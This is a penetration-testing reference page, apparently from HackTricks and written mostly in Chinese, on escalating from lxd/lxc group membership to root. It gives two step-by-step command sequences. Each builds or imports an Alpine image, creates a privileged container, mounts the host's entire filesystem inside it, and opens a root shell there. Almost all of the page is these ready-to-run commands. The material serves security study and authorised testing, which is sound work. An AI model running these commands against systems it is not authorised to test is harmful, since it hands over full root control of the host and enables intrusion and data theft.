# lxd/lxc Group - Privilege escalation

{{#include ../../../banners/hacktricks-training.md}}

如果你属于 _**lxd**_ **或** _**lxc**_ **组**，就可以成为 root

## 无需 internet 的 Exploiting

### Method 1

你可以从可信的 repository 下载一个用于 lxd 的 alpine image。

Canonical 每天都会在其网站上发布构建版本：[https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)

只需从最新的构建版本中获取 **lxd.tar.xz** 和 **rootfs.squashfs**。（目录名称就是日期）。

或者，你也可以在自己的机器上安装这个 distro builder：[https://github.com/lxc/distrobuilder](https://github.com/lxc/distrobuilder)（按照 github 中的说明操作）：
```bash
# Install requirements
sudo apt update
sudo apt install -y golang-go gcc debootstrap rsync gpg squashfs-tools git make build-essential libwin-hivex-perl wimtools genisoimage

# Clone repo
mkdir -p $HOME/go/src/github.com/lxc/
cd $HOME/go/src/github.com/lxc/
git clone https://github.com/lxc/distrobuilder

# Make distrobuilder
cd ./distrobuilder
make

# Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

# Create the container - Beware of architecture while compiling locally.
sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
```
上传 **incus.tar.xz**（如果从 Canonical repository 下载，则为 **lxd.tar.xz**）和 **rootfs.squashfs** 文件，将 image 添加到 repo 并创建一个容器：
```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

# Check the image is there
lxc image list

# Create the container
lxc init alpine privesc -c security.privileged=true

# List containers
lxc list

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
> [!CAUTION]
> 如果遇到此错误 _**Error: No storage pool found. Please create a new storage pool**_\
> 运行 **`lxd init`**，并将所有选项设置为默认值。然后**重新执行**上一段命令

最后，你可以执行该容器并获得 root 权限：
```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```
### 方法 2

构建一个 Alpine image，并使用标志 `security.privileged=true` 启动它，强制容器以 root 身份与主机文件系统交互。
```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```
{{#include ../../../banners/hacktricks-training.md}}
